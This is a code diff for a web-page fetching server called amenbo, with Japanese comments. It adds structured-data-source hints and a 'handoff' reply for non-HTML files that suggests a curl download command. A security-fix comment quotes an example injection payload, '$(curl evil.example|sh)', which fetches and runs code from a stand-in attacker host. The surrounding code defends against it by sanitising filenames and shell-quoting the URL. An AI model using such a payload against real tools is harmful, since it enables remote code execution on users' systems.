@@ -18,13 +18,15 @@ import { z } from "zod";
 import { computeScreenshotCacheKey, PageCache, type CacheStatus, type ScreenshotCacheStatus } from "./cache.js";
 import { diffMarkdown, type SectionDiff } from "./diff.js";
 import { AmenboError, SectionNotFoundError } from "./errors.js";
+import { detectDataSources } from "./extract/dataSources.js";
 import { extractMarkdown, type ExtractionMethod } from "./extract/markdown.js";
 import { buildOutline, extractSection, type OutlineResult } from "./extract/outline.js";
 import { DEFAULT_PDF_MAX_BYTES, extractPdfText, looksLikePdf, markdownFromPdfText, renderPdfPages } from "./extract/pdf.js";
+import { buildHandoffPreview } from "./extract/preview.js";
 import { evaluateQuality } from "./extract/qualityScore.js";
 import { closeBrowser } from "./fetcher/browser.js";
-import { fetchPage, type FetchTier } from "./fetcher/index.js";
-import { assertHttpScheme, httpGetBinary } from "./fetcher/http.js";
+import { fetchPage, type FetchTier, type HandoffResult } from "./fetcher/index.js";
+import { assertHttpScheme, httpGetBinary, resolveDefaultMaxBodyBytes } from "./fetcher/http.js";
 import { discoverLinks, type LinksResult } from "./links.js";
 import { PolitenessManager } from "./politeness.js";
 import { captureTiledScreenshot, DEFAULT_TILE_WIDTH } from "./screenshot.js";
@@ -107,9 +109,11 @@ interface ExtractedPage {
   prunedBlockCount: number;
   adapterName: string | null;
   extractionMethod: ExtractionMethod;
+  /** 機能C: ページ内の構造化データリンクから作った最大5件のヒント行(検出ゼロなら空配列)。 */
+  dataSourceHints: string[];
 }
 
-type FetchAndExtractResult = { status: "not_modified" } | ExtractedPage;
+type FetchAndExtractResult = { status: "not_modified" } | { status: "handoff"; handoff: HandoffResult } | ExtractedPage;
 
 /** URLとselectorの組から、新規取得・変換したMarkdownと品質スコア/pruning/アダプタ/ジオメトリ結果を作る。 */
 async function fetchAndExtract(
@@ -120,6 +124,11 @@ async function fetchAndExtract(
   const fetchResult = await fetchPage(url, conditionalHeaders ? { headers: conditionalHeaders } : {});
   if ("notModified" in fetchResult) {
     return { status: "not_modified" };
+  }
+  // 機能B: HTML/PDF以外のコンテンツはハンドオフ応答(メタデータ+プレビュー+curl誘導)の対象。
+  // Markdown抽出・品質判定・キャッシュ保存は行わない。
+  if ("handoff" in fetchResult) {
+    return { status: "handoff", handoff: fetchResult };
   }
 
   let extracted = extractMarkdown(fetchResult.html, {
@@ -138,7 +147,7 @@ async function fetchAndExtract(
     try {
       await politeness.waitTurn(url); // 追加のブラウザ遷移が発生するため、律速のため再度順番を待つ
       const browserFetchResult = await fetchPage(url, { forceBrowser: true });
-      if (!("notModified" in browserFetchResult)) {
+      if (!("notModified" in browserFetchResult) && !("handoff" in browserFetchResult)) {
         const browserExtracted = extractMarkdown(browserFetchResult.html, { url: browserFetchResult.finalUrl, geometry: browserFetchResult.geometry });
         if (browserExtracted.extractionMethod === "geometry") {
           extracted = browserExtracted;
@@ -151,6 +160,12 @@ async function fetchAndExtract(
   }
 
   const quality = evaluateQuality(extracted.qualityInput);
+
+  // 機能C: 最終的に採用したfetch結果(HTTP tier、またはジオメトリ再エスカレーション成功時は
+  // browser tier)のHTMLからページ内の構造化データリンクを検出する。screenshotモードへの
+  // 自動切替(mode:auto)はこの後server.ts側で判定されるため、ここでは常に計算しておき
+  // (検出ゼロならトークン増ゼロ)、screenshot応答側では単に参照しない。
+  const dataSourceHints = detectDataSources(finalFetchResult.html, finalFetchResult.finalUrl);
 
   return {
     status: "fetched",
@@ -165,6 +180,7 @@ async function fetchAndExtract(
     prunedBlockCount: extracted.prunedBlockCount,
     adapterName: extracted.adapterName,
     extractionMethod: extracted.extractionMethod,
+    dataSourceHints,
   };
 }
 
@@ -181,10 +197,16 @@ interface ResolvedPage {
   extractionMethod: ExtractionMethod;
   /** 新規フェッチ(cacheStatus==='miss')の場合のみ、上書き前の旧キャッシュ内容(§3-3差分応答用)。 */
   previousMarkdown: string | null;
+  /** 機能C: ページ内の構造化データリンクから作った最大5件のヒント行(検出ゼロなら空配列)。 */
+  dataSourceHints: string[];
 }
+
+/** 機能B: 非HTMLコンテンツはMarkdown化・キャッシュ対象外のため、ResolvedPageとは別枝で扱う。 */
+type ResolvePageResult = ResolvedPage | { kind: "handoff"; handoff: HandoffResult };
 
 function pageFromCacheEntry(url: string, cached: ReturnType<PageCache["get"]>, cacheStatus: CacheStatus): ResolvedPage {
   const metadata = cached?.metadata ?? {};
+  const dataSourceHints = Array.isArray(metadata.dataSourceHints) ? (metadata.dataSourceHints as string[]) : [];
   return {
     title: (metadata.title as string | null) ?? null,
     finalUrl: (metadata.finalUrl as string | undefined) ?? url,
@@ -197,6 +219,7 @@ function pageFromCacheEntry(url: string, cached: ReturnType<PageCache["get"]>, c
     adapterName: (metadata.adapterName as string | null) ?? null,
     extractionMethod: (metadata.extractionMethod as ExtractionMethod | undefined) ?? "readability",
     previousMarkdown: null,
+    dataSourceHints,
   };
 }
 
@@ -204,12 +227,16 @@ function pageFromCacheEntry(url: string, cached: ReturnType<PageCache["get"]>, c
  * URL(+selector)からMarkdownを解決する。selector指定時はURL単位のキャッシュを使わない
  * (同一URLでも抽出結果がselector毎に変わるため)。品質スコア/アダプタ判定結果もキャッシュ
  * メタデータへ保存し、'fresh'なキャッシュ応答時にも再フェッチ無しでmode:autoの判定を再現する。
+ * 機能B: 非HTMLコンテンツ(ハンドオフ対象)を取得した場合は { kind: "handoff" } を返す。
  */
-async function resolvePage(url: string, selector: string | undefined): Promise<ResolvedPage> {
+async function resolvePage(url: string, selector: string | undefined): Promise<ResolvePageResult> {
   if (selector) {
     const result = await fetchAndExtract(url, selector, undefined);
     if (result.status === "not_modified") {
       throw new UnexpectedNotModifiedError(url);
+    }
+    if (result.status === "handoff") {
+      return { kind: "handoff", handoff: result.handoff };
     }
     return {
       title: result.title,
@@ -223,6 +250,7 @@ async function resolvePage(url: string, selector: string | undefined): Promise<R
       adapterName: result.adapterName,
       extractionMethod: result.extractionMethod,
       previousMarkdown: null,
+      dataSourceHints: result.dataSourceHints,
     };
   }
 
@@ -241,6 +269,10 @@ async function resolvePage(url: string, selector: string | undefined): Promise<R
     if (!cached) throw new UnexpectedNotModifiedError(url);
     cache.touch(url);
     return pageFromCacheEntry(url, cached, "revalidated");
+  }
+
+  if (result.status === "handoff") {
+    return { kind: "handoff", handoff: result.handoff };
   }
 
   const previousMarkdown = cached?.markdown ?? null;
@@ -266,6 +298,7 @@ async function resolvePage(url: string, selector: string | undefined): Promise<R
       prunedBlockCount: result.prunedBlockCount,
       adapterName: result.adapterName,
       extractionMethod: result.extractionMethod,
+      dataSourceHints: result.dataSourceHints,
     },
   });
 
@@ -281,6 +314,7 @@ async function resolvePage(url: string, selector: string | undefined): Promise<R
     adapterName: result.adapterName,
     extractionMethod: result.extractionMethod,
     previousMarkdown,
+    dataSourceHints: result.dataSourceHints,
   };
 }
 
@@ -393,6 +427,11 @@ function budgetExceededLine(paginated: PaginatedResult): string[] {
   return paginated.exceededBudget ? [`budget_exceeded: true(単一ブロックがmax_tokensを超過しています)`] : [];
 }
 
+/** 機能C: 構造化データリンクのヒント(検出ゼロなら空文字=トークン増ゼロ)。 */
+export function dataSourcesSection(hints: string[]): string {
+  return hints.length > 0 ? `\n\ndata_sources:\n${hints.join("\n")}` : "";
+}
+
 function formatMarkdownResponse(page: ResolvedPage, paginated: PaginatedResult, sectionId: string | null, templateRemovedCount: number): string {
   const header = [
     `title: ${page.title ?? "(なし)"}`,
@@ -409,7 +448,7 @@ function formatMarkdownResponse(page: ResolvedPage, paginated: PaginatedResult, 
     ...templateRemovedLine(templateRemovedCount),
     ...budgetExceededLine(paginated),
   ].join("\n");
-  return `${header}\n\n${paginated.content}`;
+  return `${header}\n\n${paginated.content}${dataSourcesSection(page.dataSourceHints)}`;
 }
 
 /** §3-3 差分応答: 本文ハッシュ一致(約10トークンの短文応答)。 */
@@ -447,7 +486,7 @@ function formatDiffResponse(page: ResolvedPage, sections: SectionDiff[], templat
     ...templateRemovedLine(templateRemovedCount),
   ].join("\n");
 
-  return `${header}\n\n${sections.map(formatSectionDiffBlock).join("\n\n")}`;
+  return `${header}\n\n${sections.map(formatSectionDiffBlock).join("\n\n")}${dataSourcesSection(page.dataSourceHints)}`;
 }
 
 function formatOutlineResponse(page: ResolvedPage, outline: OutlineResult, templateRemovedCount: number): string {
@@ -471,7 +510,7 @@ function formatOutlineResponse(page: ResolvedPage, outline: OutlineResult, templ
   return `${header}\n\n${body}`;
 }
 
-function buildScreenshotContent(
+export function buildScreenshotContent(
   page: { title: string | null },
   screenshot: ResolvedScreenshot,
   reason: string | null,
@@ -499,6 +538,66 @@ function formatLinksResponse(url: string, result: LinksResult): string {
   const header = [`url: ${url}`, `source: ${result.source}`, `count: ${result.links.length}${result.truncated ? " (truncated)" : ""}`].join("\n");
   const body = result.links.map((link) => (link.title ? `- ${link.title} — ${link.url}` : `- ${link.url}`)).join("\n");
   return `${header}\n\n${body || "(リンクが見つかりませんでした)"}`;
+}
+
+// ---- 機能B: 非HTMLコンテンツのハンドオフ応答 ----
+
+/**
+ * URLのパス末尾からファイル名を推測する(curl -o のデフォルト値用)。取れなければ"download"。
+ *
+ * セキュリティ修正(CWE-78): WHATWG URLパーサは `'` `;` `|` `$` `` ` `` 等のパス中の文字を
+ * パーセントエンコードしないため、攻撃者が細工したURL(例: `/$(curl evil.example|sh).csv`)経由で
+ * このファイル名がそのままシェルコマンド文字列(hint行)に混入し、コマンドインジェクションが
+ * 成立しうる。curlに渡す提案コマンドの一部として安全に提示できるよう、英数字・`.`・`-`・`_`
+ * 以外は全て `_` に置換する。
+ */
+export function guessFilename(url: string): string {
+  const rawBase = (() => {
+    try {
+      const pathname = new URL(url).pathname;
+      return pathname.split("/").filter((segment) => segment.length > 0).pop() ?? "";
+    } catch {
+      return "";
+    }
+  })();
+  const sanitized = rawBase.replace(/[^A-Za-z0-9._-]/g, "_");
+  return sanitized.length > 0 ? sanitized : "download";
+}
+
+/**
+ * シェルの単一引用符コンテキストへ値を安全に埋め込む(CWE-78対策)。
+ * 単一引用符内では `'` 以外は解釈されないため、`'` のみ「引用符を閉じ、
+ * エスケープ済み`'`を1つ挿入し、再び引用符を開く」(`'\''`)という定石で表現する。
+ */
+export function shellQuoteSingle(value: string): string {
+  return `'${value.replace(/'/g, `'\\''`)}'`;
+}
+
+/**
+ * 機能B: HTML/PDF以外のコンテンツタイプを「行き止まり」のエラーではなく、
+ * メタデータ+プレビュー+curl誘導の正常応答として整形する。
+ * ファイル全体がAMENBO_MAX_BODY_BYTESを超える場合(Content-Length既知時)は
+ * プレビュー自体を省略し、メタデータ+誘導のみを返す。
+ */
+export function formatHandoffResponse(handoff: HandoffResult, maxTokens: number): string {
+  const filename = guessFilename(handoff.finalUrl);
+  const sizeKnown = handoff.declaredSize !== null;
+  const sizeLabel = sizeKnown ? `${handoff.declaredSize}` : `${handoff.bytes.length}(取得分。Content-Lengthヘッダ無し)`;
+  const oversized = sizeKnown && (handoff.declaredSize as number) > resolveDefaultMaxBodyBytes();
+
+  const header = [
+    `content_type: ${handoff.contentType ?? "(不明)"}`,
+    `size: ${sizeLabel}`,
+    `url: ${handoff.finalUrl}`,
+    `mode_used: handoff`,
+  ].join("\n");
+
+  const preview = oversized ? null : buildHandoffPreview(handoff.bytes, handoff.contentType, maxTokens, handoff.truncated);
+  const previewBlock = preview ? `\n\n${preview.body}${preview.note ? `\n\n(${preview.note})` : ""}` : "";
+
+  const hint = `\n\nhint: このファイルはamenboの本文抽出対象外です。全体の取得は curl -L -o ${filename} ${shellQuoteSingle(handoff.finalUrl)} を推奨します`;
+
+  return `${header}${previewBlock}${hint}`;
 }
 
 // ---- PDF対応(URL判定で独立経路。mode/selector/section等は適用しない) ----
@@ -588,7 +687,14 @@ async function handleFetchTool(input: FetchToolInput): Promise<Array<TextBlock |
     return handlePdfFetch(input.url, page, maxTokens);
   }
 
-  const resolved = await resolvePage(input.url, input.selector);
+  const resolvedOrHandoff = await resolvePage(input.url, input.selector);
+
+  // 機能B: 非HTMLコンテンツはMarkdown抽出・キャッシュ・mode/selector/section等を適用せず、
+  // メタデータ+プレビュー+curl誘導のハンドオフ応答を返す(PDFのURL判定と同様の独立経路)。
+  if ("kind" in resolvedOrHandoff) {
+    return [{ type: "text", text: formatHandoffResponse(resolvedOrHandoff.handoff, maxTokens) }];
+  }
+  const resolved = resolvedOrHandoff;
 
   // Phase 4 テンプレート学習: 定型ブロック(ヘッダ/フッタ/定型ナビ等)を表示直前に除去する。
   // force_fullで無効化できる。selector指定時はページ全体ではなく特定要素の抽出結果なので対象外。
@@ -737,7 +843,18 @@ async function main(): Promise<void> {
   await server.connect(transport);
 }
 
-main().catch((error: unknown) => {
-  console.error("amenboサーバーの起動に失敗しました:", error);
-  process.exit(1);
-});
+/**
+ * このモジュールが直接実行された(node dist/server.js / tsx src/server.ts / binエントリ経由)場合のみ
+ * trueを返す。テスト(vitest)がformatHandoffResponse等のユニットテストのためにこのファイルを
+ * importした際、stdioトランスポート接続(main())が誤って走ってテストプロセスがハングするのを防ぐ。
+ */
+function isDirectlyExecuted(): boolean {
+  return typeof process.argv[1] === "string" && fileURLToPath(import.meta.url) === process.argv[1];
+}
+
+if (isDirectlyExecuted()) {
+  main().catch((error: unknown) => {
+    console.error("amenboサーバーの起動に失敗しました:", error);
+    process.exit(1);
+  });
+}
